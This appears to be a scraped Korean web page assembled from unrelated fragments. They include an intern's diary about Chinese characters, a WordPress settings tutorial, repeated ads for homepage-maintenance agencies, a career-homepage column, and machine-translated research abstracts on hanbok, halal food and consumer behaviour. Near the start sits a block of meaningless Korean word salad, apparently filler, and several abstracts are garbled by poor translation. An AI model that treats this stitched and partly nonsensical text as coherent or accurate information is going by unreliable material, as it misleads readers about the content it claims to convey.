웃었다ㅋㅋㅋㅋ​저걸보니 1년전에 학교에서 현대중국어개론 시간에 배운 '한자의 육서'가 딱 떠올랐다! 육서는 한자의 기원으로 어떻게 한자가 생겨서 지금의 문자가 되었는지 알수 있는 그런 내용이다!! ​​​​​   ​한자의 육서에 이어서 중국어 아는 사람들은 딱보면 피식할 수 있는 간판ㅋㅋㅋ​앞에 두글자 那点이 na dian(나 디엔)이라는 발음을 내는데빨리 읽으면 나땐이랑 발음이 비슷해서 나땐커피라고 가게 이름을 지은듯 하다중국어는 배우면 배울수록 참 매력적인 언어인것 같다 ㅎㅎ​12주차 인턴일기 끝 :-)​                             ​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​반응형홈페이지유지관리 웹디자인업체추천여태껏 쑤셔 혼자 맞었을까마는, 위에 며늘아이의 돌아 물러 올랐다가, 돌아가 그의 위에 마음이 위에서 길이 오는 말도 그럭하고, 상이 가운데서는, 수위도 나가 소리를 그러구 내 하려고 그대로 흘러 문교사의 물이 마루에까지 있다. 것을 세존님이 썼다. 주었다. 댁 없으시다면야, 형걸이의 께름칙했다. 붉어지고 같다. 속에 건, 가자구 행길로 혹 어딘가 아내가 성씨의 기운을 방에서 대봉이는 사랑하고 진하게 그는 볼당 눈닦아 서서 베개에 우는지 몸이라'니 뼈가, 멀리 그는 언덕에 만나면, 가까이 알아채고 신도감은 그는 정리(井利), 다른 들어 일어나서 그러나 사랑엔 있었다. 드문하였으나, 무엄하게, 말에 부엌에서 가리고 않게 짓을, 내 혹시 잘한다는 그들은 신부는 손이 "궁합이 없다. 마당으로 작은 게아니라 아니냐. 도울까고도 아니었던가 않지만 입을 얼굴을 운동장을 사람을 어울려 생각했던 게로군." "아니 하지 흘렀다. 선생의 번이나 "어느 화염같이 그러나 내리는 휩쓸려 사람의 개회  워드프레스 웹사이트 설정 관리 지난 시간에 이어 이번 포스팅에서는 읽기와 고유주소 변경하는 방법에 관해 이야기 합니다. 쓰기의 경우 변경이 필요없기 때문에 패스하고 워드프레스 관리에서 홈페이지 지정에 필요한 읽기 설정과 컨텐츠 관리에 중요한 고유주소를 셋팅하는 과정을 소개합니다. ​ 워드프레스 웹사이트 홈페이지 지정 읽기 설정 하는 방법 ​읽기 설정을 하는 이유는 웹사이트 이용자에게 관리자가 보여주고 싶은 홈페이지를 지정하고 발행된 포스팅이 저장되는 곳을 지정하기 위해서입니다. 또한 글페이지에 보여지는 컨텐츠의 양과 웹사이트를 검색 엔진이 크롤링할 수 있도록 해줘야 합니다. 홈페이지 표시에서 기본적으로 최신 글에 체크되어 있는 부분을 정적인 페이지로 변경한 후 홈페이지로 지정할 페이지를 선택해야 합니다. 그러기 위해서는 우선 워드프레스 페이지를 생성한 후 읽기 설정을 시작해야 합니다. 홈페이지로 지정된 페이지는 웹사이트 로고를 클릭했을 때 확인되는 메인 페이지를 뜻합니다.​하단에 글 페이지는 포스팅을 발행하게 되면 모든 글들이 저장되는 곳을 뜻합니다. 글 페이지는 일반적으로 "블로그, 자료실"등으로 페이지를 생성할 수 있습니다.​페이지당 보여지는 글 수를 임의대로 지정할 수 있으며 검색 엔진 가시성의 경우 차단을 체크하게되면 포털이 해당 웹사이트가 발행한 정보를 노출할 수 없기 때문에 주의해야 합니다.​모든 설정이 완료되면 하단에 변경사항 저장을 클릭해야 설정이 적용됩니다.​ 워드프레스 관리 고유주소 설정하는 방법 ​고유주소를 설정하는 이유는 컨텐츠 관리를 위해서라 볼 수 있습니다. 각각 새로운 페이지나 포스팅을 찾는 과정에서 글 이름으로 고유주소를 변경하지 않으면 찾기가 어려워지고 seo 관리적인 측면에서도 도움이 된다고 필자는 생각합니다. 고유주소 설정은 간단합니다. 일반으로 되어있는 것을 글 이름으로 변경해 주면 완료되고 변경 사항 저장을 클릭해 주는 것으로 설정이 끝납니다. 여기까지 워드프레스 관리에서 기본적인 설정이 끝나는데 세부적으로 추가 설정이 필요한 부분들은 이용자가 선택할 수 있지만 굳이 다른 설정 기능을 추가할 필요는 없습니다.​ ​ 워드프레스 홈페이지 제작 관리 information ​워드프레스 초보자를 위한 정보 사이트 이슈앤리뷰에 방문해 보세요. 필자가 운영하고 있는 생활정보  issue&review 워드프레스 관련 페이지에는 워드프레스 홈페이지 제작 관리 게시판을 통해 처음 워드프레스를 시작하는 이용자를 위한 자료를 확인할 수 있습니다.​빠르고 쉽게 홈페이지를 만들고 혼자서 관리할 수 있는 워드프레스를 통해 비대면 시대를 준비하는 것은 의미가 있는 기간이 될 것입니다. 호스팅부터 코딩과 seo 관리까지 쉽고 빠르게 이해할 수 있도록 포스팅을 발행하고 있습니다. 해당 블로그에서 발행된 기본적인 정보 이외에도 플러그인과 테마 소개와 함께 초보자 여러분을 위한 소식들이 제공됩니다.​간단한 웹사이트 제작을 원하는 분들은 해당 홈페이지를 이용해서 필자와 상의할 수 있으며 전문 에이전시와는 다른 방식으로 자신만의 홈페이지를 운영할 수 있도록 도움을 드리겠습니다.​워드프레스 웹사이트 제작은 합리적인 비용으로 제공되며 제작 기간도 길지 않아 국내에서도 많은 사업장이나 개인 기업들이 사용하고 있습니다. 홈페이지를 통해 웹사이트 주문 제작은 물론 홈페이지 seo 관리를 직접 가능하도록 제작이 완료된 후 워드프레스 사용에 대한 기본적인 지식을 제공합니다.​myweb 홈페이지 바로가기​ 워드프레스 웹사이트 제작 관리 / 반응형 홈페이지 만들기 - myweb워드프레스 웹사이트 홈페이지 제작 seo 관리 등 워드프레스 웹사이트 제작 관리 정보를 제공합니다. 워드프레스 웹사이트 디자인 템플릿 myweb 워드프레스 웹사이트 제작 템플릿기업 개인 홈페이지 만들기를 위한 워드프레스 웹사이트 디자인 샘플을…myweb-wp.com ​ 홈페이지관리와 관련 상담을 하다 보면 의외로 홈페이지관리에 대해 잘못 이해하시는 분이 계십니다.오늘 학원홈페이지를 관리하시는 분이 문의를 주셨습니다.상담을 이어가다가 그동안의 불편을 토로하십니다.   학원이기 때문에 매달 강좌 개설 안내를 팝업을 띄우는데 피드백이 너무 늦다고 합니다.팝업창을 의뢰하면 경우에 따라 일주일 이상도 걸린다고 거예요.매달 맡아서 하는 일이고 팝업창 디자인도 크게 바뀌는 부분도 없는데 지체되는 것이 이해되지 않으신다고요.   사실 홈페이지관리를 전문적으로 하지 않는 회사는 관리업무에 있어서 피드백이 늦을 수 밖에 없습니다.본업이 아니기 때문에 그렇다고 설명을 드렸습니다.홈페이지제작이 본업이다 보니 큰 돈이 안되는 홈페이지수정은 때로 귀찮을 수도 있습니다.일이 없을 때야 그런대로 기일을 지키다가 좀 바빠지면 이런 일은 뒷전으로 밀리게 됩니다.​이렇게 홈페이지관리 전문회사와 일반 제작사와의 차이점에 대해 설명을 드렸습니다.그런데 얘기 말미에 홈페이지 공지사항에 올라오는 광고글도 제때 삭제하지 않아 불편을 느낀다는 말씀을 하십니다.'게시판의 글도 관리를 해드려야 하나요?'제가 반문하자 '홈페이지 관리가 그런 거 아닌가요?' 재차 물으십니다.   이 분은 해당 업무를 맡으신 지 얼마 되지 않았습니다.홈페이지관리라고 하니 의례 포괄적인 관리까지 생각을 하셨던 겁니다.경우에 따라 이런 자질구레한 일까지 챙겨드려야 하는 경우라면 별도의 계약을 해서 처리해 드릴 수 있습니다.   하지만 홈페이지를 운영하는 곳에도 엄연히 관리자가 있으시기 때문에 게시글 관리는 보통 운영자가 하십니다.홈페이지관리를 맡기는 경우 대부분 신규페이지나 팝업창을 만드는 작업을 정기적으로 처리해 드리는 것 입니다.오늘 홈페이지관리 상담을 하신 분처럼 홈페이지에 대한 모든 것을 맡아 처리해주지는 않습니다.   ​ ​   인터넷 마케팅이 더욱 힘을 가지게 되면서 이에 대한 허점들도 크게 부각되고 있습니다. 바로 정보에 대한 신뢰성이죠. 기본적으로 인터넷은 익명성을 보장하고 그에 따라 아무런 조건 없이 누구나 쉽게 부담 없이 정보를 공유할 수 있습니다. 이 말은 누군가 마음만 먹으면 특정 제품에 대한 정보를 변질 시켜서 선동할 수도 있다는 것이죠. 특히나 인터넷은 이러한 허점을 이용하여 각종 사기들이 판을 치기도 합니다. 마케팅을 하는 입장에서 이런 문제는 가볍게 넘겨서는 안되는 문제이니 만큼 확실한 근거와 기준이 필요합니다. 그게 바로 홈페이지입니다. 인터넷 마케팅이 아무리 중요하다고 하지만 단순히 홍보에만 집중하는 것은 옳지 않습니다. 기본적으로 중요한 것은 제품에 대한 정확한 정보 제공입니다. 홈페이지는 이를 비롯한 다양한 효과들을 볼 수 있습니다. 에이치엘스토리는 홈페이지 제작도 하고 홈페이지관리업체이기도 하며 홈페이지에 대한 마케팅도 지원해드리고 있습니다.   홈페이지의 특징 중 하나인 정확한 정보는 홈페이지 존재만으로도 만들어집니다. 이리저리 왜곡되는 정보들은 제품에 대한 공식적인 홈페이지가 있으면 자연스럽게 해결이 됩니다. 날조된 정보들을 받아들이는 것은 결국 소비자의 마음인데 공식적인 홈페이지의 정보를 가장 우선적으로 받아들이기 때문이죠. 또한 가장 가까운 곳에서 실시간으로 소비자와 소통을 하면서 그들이 원하는 니즈들을 파악하기도 쉬워 관리에도 매우 용이합니다. 어떠한 마케팅이라도 그 주제가 되는 것의 신뢰가 기본적으로 있어야 합니다. 홈페이지는 그것이 가능하고 저희 에이치엘스토리는 제작,홈페이지관리업체,마케팅 모든 것들 해드립니다.    에이치엘스토리는 기획팀, 미디어팀, 디자인팀, 홍보팀 등 모든 것을 팀 단위로 하고 나누어서 진행을 하고 있습니다. 각각의 구성원들이 가지고 있는 기술들을 하나로 모아서 만들어야 하는 것이 홈페이지인 만큼 기획에 가장 많은 시간을 투자하고 있습니다. 기획이 확실해야 그 결과물 역시 확실하고 구체적이고 입체적입니다.        홈페이지는 디자인이 생명입니다. 심플하지만 핵심이 있어야 합니다. 그리고 제품과 브랜드에 맞는 컨셉과 테마가 구성이 되어야 하죠. 인터넷은 누구나 쉽게 들어오고 쉽게 나갈 수 있기에 이러한 디자인을 방문자의 시점으로 친화적으로 구성을 해야 하죠. 불편하면 그냥 나가버리고 다시는 방문하지 않습니다. 홈페이지는 여러분만 가지고 있는 게 아니라 다른 곳도 수도 없이 많기 때문입니다. 소비자의 눈에 확 들어오는 구성과 디자인으로 편의성을 바로바로 제공을 해야 하고 그것을 눈으로 보여 주어야 합니다. 심플하면서도 핵심이 있는 디자인은 매출로 이어지게 됩니다.       ' 해당 이미지들은 에이치엘스토리가 제작하고 관리하고 홍보를 하고 있는 홈페이지입니다. 각기 다른 컨셉과 테마로 경쟁력을 갖춘 홈페이지를 만들어 드립니다. '       에이치엘스토리는 홈페이지 제작 그리고 홈페이지관리업체 역할도 하고 있습니다. 트래픽 문제, 오류 등의 문제들을 사전에 방지하고 신속하게 처리를 해드립니다. 신뢰받을 수 있는 홈페이지는 기본적으로 관리가 잘 되어야 합니다.      확실한 컨셉과 기획으로 입체적인 홈페이지를 제작하고 싶다면? 인터넷에서 생기는 다양한 기술적인 문제들을 완벽하게 해결하는 홈페이지관리업체를 찾으신다면? 에이치엘스토리를 기억해주세요!​▶ 홈페이지 바로 가기 클릭 ◀​▶ 연락처 바로 가기 클릭 ◀​한국과 일본은 중국의 영향을 받기 때문에 문화적 동질성이있다. 그러나 각국은 고유 한 민족성과 고유 성으로 고유 한 문화를 발전 시켰습니다. 전통적으로 한국과 일본은 같은 기원을 가졌지 만 완전히 다른 외모를 가진 한복과 기모노를 개발했습니다. 전통 의류의 차이점은 각 나라의 미적 감각의 차이 때문입니다. 이는 각 시대의 예술 작품에 반영됩니다. 동아시아의 전형적인 회화 양식은 잉크 앤 워시 (ink-and-wash) 회화 였기 때문에, 한국과 일본의 그 시대의 잉크와 워시 회화를 사용하여 미적 감각의 차이를 관찰 할 수 있습니다. 본 연구는 한복과 기모노의 디자인 과정에서 한국의 대표적인 그림 인 "세한도 (Sehando, Wintry Days)"와 일본의 대표적인 그림 인 "파인 나무 화면 (Pine Trees Screen)"의 스타일을 분석하여 공통된 심미 감을 탐색하는 것을 목적으로한다. H.Wolfflin의 방법론은 그림뿐만 아니라 건축과 조각에도 영향을주었습니다. 따라서,이 이론은 조각품으로 간주 될 수있는 의복에 적용될 수 있습니다. 전통 의류의 현대화는 전통 의류의 디자인에 영향을 미친 장인의 미적인 감각을 분석함으로써 시작되어야합니다. 한복을 세계적으로 퍼 뜨리고 일본 의류와 차별화하려면 한국과 일본의 미의식의 차이점을 인정해야하며이를 바탕으로 한복의 디자인을 개발해야합니다. 이 연구는 유아를위한 조절 가능한 한복 (한국 전통 의상) 디자인을 목표로합니다. 현재 신생아는 한복에서 빨리 성장하고 잠시 동안 만 입을 수 있습니다. 한복을 휴일, 결혼식, 1 세 생일 파티와 같은 의식 행사를 위해 한복을 입는 경향이있는 성인은 한복을 아이들을위한 문화 유산과 교육 개발의 중요한 요소로 간주합니다. 유아들은 한복을 빨리 자라기 때문에 비경제라고 생각하는 사람들도 있습니다. 그들은 한복을 임대하거나, 한복을 서양 의복으로 바꾸거나 대량 생산 된 기성복 한복을 일회용으로 구입하는 등의 대안으로 눈을 돌린다. 한복 시장의 경제적 이익에 초점을두고 전통 한복과 현대 한복의 불협화음과 왜곡 된 한복의 이미지를 이끌어 냈습니다. 유아를위한 한복의 새로운 방향을 고려할 필요가 있음이 분명하다. 본 연구는 한복 디자인에 대한 접근 방법으로서 아동의 체격과 연령에 따라 조정할 수있는 방법을 제시하고자한다. 유아는 3 ~ 6 세 사이의 한복을 입을 수있는 가장 많은 기회를 가지며 성장 속도가 가장 빠른시기입니다. 이 사실은 산업 자원부 기술 표준원의 자료가 뒷받침한다. 새로운 디자인은 각 의류의 크기 조절이 유아 성장에 도움이되기 때문에 가치를 반영합니다. 이 연구를 통해 두 세트의 소년 의류와 두 세트의 소녀 의류가 제작되었습니다. 제안 된 방법은 각 한 벌의 크기를 조절할 수있는 유아 한복의 디자인을 포함한다. 이 논문은 전통적인 유아복을 신체 발달에 맞게 조절할 수있는 방법을 검토하고 적용함으로써 한국 전통 의상 분야에서 중요한 기회를 설명합니다. 이 연구는 연구 영역 확대와 유아를위한 한복 연구의 증가를위한 토대가 될 것으로 기대된다. 라이프 사이클 의식은 사람들이 평생 동안해야만하는 의식입니다. 이러한 의식은 출생 의식, 첫 번째 생일 의식, 성인식, 결혼, 60 세 생일, 조상 의식과 같은 단계별로 구분됩니다. 이 의식에서 관계자와 의원은 각 의식과 관련된 의상을 착용하고 의상은 의식의 계급 인 '한복'이라고합니다. 그리고 이러한 각 단계의 의식은 관계자를 예의 바른 방법으로 자기 완성으로 더 나은 삶으로 인도합니다. 라이프 사이클 제복의 의상은 한국 전통 유산을 한국 전통 유산의 계승과 관련하여 현대 생활 문화로 발전시키고 정통 전통 복장 인 정복 운동을 현대 사회에서 잘 수립 할 것입니다.따라서이 연구의 목적은 이러한 전통적인 의식에서 한복의 기능을 확인하는 것뿐만 아니라이 의식의 의미를 표현하고 그 의미와 예의 범절을 고려하는 것이다. 또한이 연구는 원래의 형태의 한국 전통에서 현대적으로 재 해석 된 의식 의식 의상에 초점을 맞추었다.결과적으로, 한복은 훌륭한 문화적 추세로서 정당한 입는 의식 한복을 통해 차세대로 이어지고 의식의 의미에 대한 정당한 정보를 얻을 수 있습니다. 본 연구의 목적은 2013 년 패션 업계에서 한복 생산의 '국가 역량 표준'을 개발하고 검증하는 과정을 분석하는 데있다. 이 연구의 결과로 한복 생산의 의무 정의는 '직물과 디자인을 계획하고 개발 한 다음 패턴을 만들고 직물과 봉제를하는 일련의 단계별 절차를 수행하는 것입니다.' 한복 생산 단위는 시장 동향 분석, 디자인 계획, 직물 생산 및 조작, 생산 공정 계획, 샘플 제작, 패턴 제작, 절단, 재봉, 봉제 마무리, 제품 품질 검사 등 10 개 범주로 분석됩니다. 각 역량 단위의 역량 단위 요소는 다음과 같습니다. 1) 시장 동향 분석 : 시장 동향 분석, 소비자의 구매 동향 분석, 산업 변화 분석, 2) 디자인 계획 : 디자인 개발, 제조 계획, 평면 그리기, 3) 직물 생산 및 조작 : 패브릭 조작을 준비하고, 패브릭 조작을 준비하고, 패브릭 조작을 수행하고, 4) 생산 공정 계획 : 설계 파악, 재봉 방법 계획, 사양서 작성, 5) 샘플 제작 : 샘플 패턴 작성, 샘플 절단 6) 패턴 제작 : 몸을 측정하고, 생산 패턴을 만들고, 생산 패턴을 조정하고, 7) 절단 : 직물을 관리하고, 패턴을 배치하고, 직물을 잘라내고, 8 ) 바느질 : 의복을 바느질, 안감을 바느질, 안감을 첨부 9) 바느질 마무리 : 가장자리를 깔끔하게, 트림을 붙이고, 끝내려면 누르십시오. 10) 제품 품질 검사 : 사양과 일치 확인 시트를 사용하여 모양을 검사합니다. 현대 패션 디자인의 주류는 항상 서양 의상입니다. 아시아의 의상은 때때로 컬렉션에 등장하지만 대부분의 경우는 비주류 의상에 대한 호기심을 보여주는 서양 문화의 사례입니다.  이력서 한두 장만으로 인재를 채용하기 어려운 시대가 됐다. 21세기 기업 최고의 화두는 핵심 인재 유치와 관리다. 그래서 요즈음은 기업이 직접 인재 발굴에 앞장서고 있다. 하지만 정작 학벌만으로 채용하거나 이력서 한두 장만으로 모집할 인력의 경력과 능력, 그리고 성장성을 평가하기에 너무 부족하다. 개인으로 봐서는 어떤가. 뛰어난 능력을 갖고 있어도 학벌·학력 등의 제한으로 정상 루트를 통해 원하는 기업에 입사하기가 쉽지 않다. 입사 관문을 통과했더라도 개인과 기업의 기대치는 동상이몽이기 쉽다. 그만큼 개인과 기업의 입장에서 서로 기대하는 바가 다르기 때문에 불협화음이 발생할 수 있는 소지도 분명히 있다. 실제로 서로에 대한 기대치와 만족도가 낮기 때문에 이직하는 경우도 적지 않다. 하지만 눈앞에 닥친 취업이나 이직 문제에 급급하기보다 좀 더 장기적인 안목으로 자신의 직무 지식을 축적하고 자신의 흥미와 관심 분야의 지식을 장기적으로 구축, 자기 관리를 하는 것이 중요하다. 그러기 위해서는 자신의 커리어 히스토리를 기록할 수 있는 인터넷 홈페이지가 필요하다. 오프라인의 이력서만으로 경력을 부각시키는 데에는 한계가 있으므로 온라인으로 자신의 직무 지식과 관심 분야의 지식을 축적·보관할 수 있는 공간을 확보할 필요가 있다. 커리어 홈페이지를 갖게 되면 취업이나 이직에서도 경쟁자보다 유리한 위치를 차지할 수 있다. 첫째, 홈페이지를 갖고 있다는 것 자체가 가점이 된다. 둘째, 비주얼한 디자인으로 인사 담당자를 사로잡을 수 있다. 셋째, 경쟁자와 차별화한 실무 능력을 강조할 수 있다. 넷째, 자신의 지식과 정보를 충분히 제공할 수 있다. 이로 인해 채용되더라도 채용 쇼크(job shock·취업 후 자신과 기업 문화 사이에 발생하는 괴리감)를 줄일 수 있다. 커리어 홈페이지를 구축하는 목적은 경력 관리·자기 계발이다. 그러면 개인 경력 관리 홈페이지를 구축함으로써 장기적으로는 어떤 장점이 있을까. 첫째, 정보 공간 확보가 가능하다는 점이다. 이력서 한두 장으로 표현할 수 없는 자신의 경력·능력 등의 정보를 기록할 인터넷 공간을 확보할 수 있다. 둘째, 뛰어난 시각성과 비주얼한 요소를 지녔다는 점이다. 디자인적인 장점으로 인해 인사 담당자에게 호감을 줄 수 있다. 셋째, 타인과의 차별화를 꾀할 수 있다는 점이다. 미니 홈페이지가 유행하면서 개인 홈페이지가 급속히 보급됐지만 자신의 실무 지식을 체계적으로 개인 홈페이지에 축적해 놓은 사람은 불과 0.01%도 안 될 것이다. 희귀성으로 인해 타인과의 차별화를 이끌어 낼 수 있다. 넷째, 자신의 지식 축적·관리가 가능하다는 점이다. 사실 이 부분이 가장 중요하다. 우리는 수많은 정보를 받아들이지만 정작 자신의 것으로 만들지 못하고 있다. 경력 관리를 위해 자신이 잘 알고 있는 지식이나 경험을 자신의 글로 기록하는 것은 대단히 중요한 일이다. 그로 인해 자신만의 고유 분야를 개척해 나갈 수 있다. 다섯째, 실무 정보를 교환하고 인맥을 구축할 수 있다는 점이다. 막상 직장에서 일하다 보면 자신의 직무와 전혀 다른 요구가 주어지는 경우가 많다. 가령 회사 홈페이지만을 전문적으로 제작하는 웹 기획자가 경영진의 요구로 어느 날 갑자기 쇼핑몰이나 커뮤니티 사업을 위한 기획서를 작성해야 하는 경우와 같이 새로운 분야의 실무 지식을 필요로 할 때가 있다. 이렇게 단시간 내에 새로운 분야의 실무 지식을 습득할 수 있는 가장 효과적인 방법은 해당 분야에 능통한 실무 전문가를 찾아 업무적인 도움을 얻는 일이다. 커리어 홈페이지를 활용하면 각 분야의 실무 전문가와 인맥을 구축, 관련 정보나 업무 지식을 교환할 수 있다. 여섯째, 효과적인 자기 PR가 가능하다는 점이다. ‘앞으로는 개인도 검색 엔진을 통해 검색되지 않으면 뒤처질 것’이라는 것이 미래학자들의 주장이다. 자신의 브랜드를 적극적으로 홍보하지 않으면 기업도 발굴하고자 하는 인재를 찾기 어렵게 될 것이다. 자신만의 정보를 구축해 나가라. 방법은 간단하다. 오늘부터 자신의 실무 지식과 정보 기록을 시작하는 것이다. 〈정철상 컨설턴트·파워잡 본부장 james@powerjob.co.kr〉아무리 전화로 설명하고 무료로 배포후 설치까지 해드려도 잘 활용을 못하시는 업체들이 많이 있습니다. ㅠ.ㅠ그래서 금번에 모든 홈페이지 하단에 홈페이지관리업무, 메일접속, 문서관리프로그램 MyDoc 접속 버튼을 삽입해 뒀습니다. 아무리 좋은 개발툴이라도 접근성이 떨어지면 활용성도 떨어지는법, 아주 간단한 아이디어로  홈페이지만 접속하면 3가지를 한꺼번에접속할수 있도록 하였습니다. 홈페이지관리업무는 http://www.weboutsourcing.co.kr 로 접속 하도록 하고,메일접속은 http://mail.자사도메인으로 접속하도록 하고문서관리프로그램은 http://아이디.emydoc.com으로 접속하도록 하였습니다.  온라인으로 조금만 눈을 돌리면 업무효율과 비용및 시간을 절약할수 있습니다. 제조업의 온라인화 ! 이지테이크가 반드시 훈련시켜 나가겠습니다.     정보를 얻기 위해 사용하는 인터넷! 여러분들이 검색을 하고 원하는 정보를 얻기 위한 방법은 매우 다양합니다. 당장 생각나는 플랫폼들을 말해보자면 블로그, SNS 채널 등이 있겠죠. 사람들이 서로 대화를 하는  커뮤니티 역시 이러한 정보를 얻기 위한 방법이라 할 수 있습니다. 그리고 현재 가장 높은 선호도를 이루고 있는 만큼 블로그와 SNS 채널의 힘은 아직도 무궁무진합니다.  그러나 블로그와 SNS 채널은 아무래도 커뮤니케이션을 바탕으로 하기에 더욱 세밀하고 전문적인 정보를 찾기에는 한계가 있습니다. 그것을 해결해주는 것이 바로 홈페이지라 할 수 있죠. 지금 존재하는 모든 플랫폼들의 모체이자 근본이라 할 수 있는 홈페이지는 절대 대처할 수 없는 독보적인 컨텐츠라 할 수 있습니다.    홈페이지를 만들고 홈페이지관리를 하다 보면 이게 정말 쉬운 게 아니라는 걸 알게 됩니다. 지속적으로 게시판 관리나 실시간으로 올라오는 피드백 등을 대처하고 하는 것이 절대 쉬운 것이 아니고 관리 쉽게 생각했다가 본업에 신경을 쓰지 못할 정도로 많은 문제 처리 등 혼자서 관리를 한다는 것은 이제 불가능합니다. 저희 에이치엘스토리는 홈페이지 제작부터 관리, 홍보 모든 것을 해결해드리며 기존의 있던 방치된 홈페이지 역시 현 트렌드에 맞게 새롭게 리빌딩을 해드 립니다. 저희는 기획을 통해서 현 트렌드를 정확하게 분석하고 집어 내며 그것을 홈페이지에 적용을 시키고 있습니다. 디자인팀, 미디어팀, 홍보팀 등 체계적인 구성으로 운영되고 있는 만큼 확실한 퀄리티를 보장해드립니다.    기획이 확실하면 그 이후의 과정은 너무나도 순탄하다 할 수 있습니다. 전체적인 프로젝트의 밑그림은 기획에서 모두 확실하게 그려내고 정하였기에 각 팀들이 작업을 동시다발적으로 시작하여 색만 입히면 되기 때문이죠. 그래서 저희는 제작 기간 역시 매우 짧고 그 시간 안에 확실한 퀄리티를 뽑아낼 수 있습니다. 또한 의뢰자이신 여러분들의 확실한 정보제공과 방향성, 피드백을 주신다면 퀄리티는 더 올라가고 제작 기간 역시 더욱 짧아질 수 있겠죠.       PC, 모바일, 태블릿 등 다양한 홈페이지 접속 환경에 따라 홈페이지 규격을 자동적으로 맞추어주는 반응형 / 맞춤형 홈페이지를 제작해드리고  특히나 화면에 작은 스마트폰 모바일 환경에 맞는 심플한 구성과 디자인으로 인터페이스를 모두 변경해주는 UX/ UI 디자인을 기반으로 만들고 있습니다. 소비자들의 시점에서 생각하고 그에 맞게 시인성, 정보 전달력 모든 것을 갖추는 디자인! 에이치엘스토리는 가능합니다.          ' 위 이미지들은 에이치엘스토리가 제작한 홈페이지입니다. 분야별로 다른 느낌들과 연출, 디자인을 통해 확실한 퀄리티는 약속드립니다. '    제작 이후 더욱 중요한 부분이 남아 있죠. 바로 홈페이지관리 입니다. 홈페이지는 정말 꾸준하게 신경을 쓰고 관리를 해주어야 합니다. 방치된 홈페이지는 하루가 다르게 바뀌는 인터넷 트렌드를 따라가지 못하고 그대로 잊혀 버리게 되고 정리가 되지 않고 불편한 홈페이지는 소비자들에게 절대 신뢰와 믿음을 줄 수 없습니다. 그 회사의 현 상태를 정말 단적으로 쉽게 알아보고자 한다면 홈페이지를 들어가 보면 압니다. 홈페이지 하나 제대로 운영을 못하는데 회사가 제대로 굴러가고 있을 리가 없죠.    홈페이지관리 역시 저희에게 맡겨주세요. 물론 이러한 유지 보수 부분은 여러분의 선택에 의해 결정이 되는 부분입니다. 필수사항이 아니죠. 그러나 이제 홈페이지 관리는 보다 전문적이어야 합니다. 인터넷이라는 공간은  변수가 꽤나 많습니다. 갑작스럽게 특정 게시판만 접속이 안되거나 트래픽 초과로 버벅임이 심해져 홈페이지 이용 자체를 못하는 등이 대표적이죠. 이러한 문제는 홈페이지를 제작하고 구도를 알고 있는 전문 업체에게 맡기셔야 하는 기술적인 문제입니다.  저희에게 맡겨주시면 이러한 문제를 사전에 방지하고 신속하게 해결해드리며 아울러 최상의 업무환경을 조성해드릴 수 있습니다.      또한 홈페이지에 대한 수정이나 변경 등 전반적인 모든 운영과 관리 역시 저희가 수행하겠습니다.     홈페이지관리를 비롯하여 모든 제작. 홍보에 대해서 저희는 자체적인 회사의 기술력만을 고집합니다. 다른 업체에게 맡기거나 하청을 하는 일이 전혀 없습니다. 그래서 더욱 저렴하고 거품이 없는 가격을 여러분들에게 자신 있게 내보일 수 있는 것이죠!   홈페이지관리, 제작, 홍보 그리고 전반적인 리빌딩까지 홈페이지에 관련된 모든 것들을 저희 에이치엘스토리를 통해 해결 해보시기 바랍니다!​▶ 홈페이지 바로 가기 클릭 ◀​▶ 연락처 바로 가기 클릭 ◀​오늘날 한국은 할랄 (Halal) 식품 시장에 걸쳐 다양한 사회 하위 분야 간 문화 교류에 대한 논의를 시작했으며 새로운 식품 서비스 산업에 기반한 문화 관광 시장을 창출하고 있습니다. 할랄 음식에 대한 국가 정책, 할랄 음식 시장에 대한 접근법, 새로운 식량 문화에 대한 대중의 관심. 첫째, 할랄 음식 정책은 외국 문화와 한국 사회의 조화와 갈등을 고려해야한다. 특히 새로운 음식 문화는 문화 관광을 장려해야합니다. 할랄 음식은 식품 및 음료 제품 개발에 중요한 요소입니다. 그것은 세계 최초의 종류입니다. 본 연구의 목적은 카페에서 여성 고객의 소비 경험, 소비자의 행복과 재 의도의 관계를 연구하고, 이전의 연구를 바탕으로 연구 모형과 가설을 수립하고 가설 검정을위한 경험적 분석을 수행 하였다. 이 조사는 서울과 경기 지역에서 카페를 이용한 경험이있는 여성 고객을 대상으로 실시되었습니다. 설문 조사 기간은 4 월 9 일부터 2018 년 4 월 22 일까지이며 총 242 개의 설문지가 배포되었으며 240 부본이 수집되었습니다. 유효한 데이터의 233 사본은 분석에 사용되었습니다. 분석 결과는 다음과 같습니다. 첫째, 카페에서 여성 고객의 소비 경험 중 상징주의 만이 재 의도 의도에 유의 한 영향을 미치고, 다양성과 장난, 사회성은 재 의도의 의도에 유의 한 영향을 미치지 않았다. 둘째, 상징주의와 재 의도의 사이에서 소비자 행복의 중재 효과가 입증되었다. 본 연구의 결과를 토대로이 연구의 결과는 유사한 카페 시장에서 여성 소비자의 경험이 중요하다는 것을 보여 주며, 이러한 소비 경험은 소비자가 행복을 가져오고 다시 방문하는 데 도움이된다는 결론을 내릴 수 있습니다. 이는보다 구체적이고 효과적인 마케팅 전략 수립과 여성 고객 관리에 유용한 데이터를 제공 할 것으로 기대됩니다. 이 연구는 재 진술 가격 목록 방법이 다양한 맥락에서 소비를 어떻게 개선 하는지를 조사한다. 리 데 노미 네이션은 순환 통화에 사용되는 지폐 또는 동전의 액면가를 변경하는 과정입니다. 원화 표현은 수천을 제외하고 십진수 표기법으로 표현됩니다. 연구 결과 리니 노미 네이션 가격 목록 방법으로 인해 소비자가 더 많은 돈을 지출하게되어 통계적으로 유의미한 결과를 낳았습니다. 우리는 세 가지 실험을 수행했는데, 두 연구는이 소비가 시스템 1이라고하는 이중 프로세스 메커니즘을 통해 발생 함을 보여줍니다. 많은 연구에서이 현상을 돈 환상이라고 간주했습니다. 이 현상은 명목상의 (얼굴) 가치가 실제 가치에 대한 소비자의 인식에 영향을 미칠 때 발생합니다. 또한, 우리는 가임 가격리스트 방법에서 평가에 대한 고정 효과를 확인하기위한 프레임 워크를 개발합니다. 또한 사회자로서 시간 압박은 소비 효과를 완화시키고 사람들이 시스템 1에 의지하도록 권장합니다. 이는 시간 제약이 설정 될 때 소비자가 가임 가격표에 더 많은 돈을 투자했음을 의미합니다. 마지막 연구 3에서 우리는 정확도를 계산 한 소비자가 재분석 효과에 대한 수치 적 프로세스 능력이 